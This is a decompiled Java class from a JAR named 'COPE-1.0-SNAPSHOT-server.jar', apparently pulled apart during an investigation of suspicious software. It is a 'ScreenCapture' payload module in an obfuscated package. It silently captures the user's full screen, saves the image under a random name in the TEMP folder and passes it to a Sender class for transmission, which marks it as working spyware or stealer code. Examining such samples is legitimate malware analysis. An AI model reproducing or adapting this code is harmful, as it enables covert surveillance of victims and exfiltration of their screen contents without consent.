/*    */ package idasido.adldaosd.wpiw.payload.impl;
/*    */ 
/*    */ import idasido.adldaosd.wpiw.payload.Payload;
/*    */ import idasido.adldaosd.wpiw.payload.Sender;
/*    */ import java.awt.Dimension;
/*    */ import java.awt.Rectangle;
/*    */ import java.awt.Robot;
/*    */ import java.awt.Toolkit;
/*    */ import java.awt.image.BufferedImage;
/*    */ import java.io.File;
/*    */ import java.util.Random;
/*    */ import javax.imageio.ImageIO;
/*    */ 
/*    */ public final class ScreenCapture
/*    */   implements Payload {
/*    */   public void execute() throws Exception {
/* 17 */     Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
/* 18 */     Rectangle screenRectangle = new Rectangle(screenSize);
/* 19 */     Robot robot = new Robot();
/* 20 */     BufferedImage image = robot.createScreenCapture(screenRectangle);
/* 21 */     int random = (new Random()).nextInt();
/* 22 */     File file = new File(System.getenv("TEMP") + "\\" + random + ".png");
/* 23 */     ImageIO.write(image, "png", file);
/* 24 */     Sender.send(file);
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\impl\ScreenCapture.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */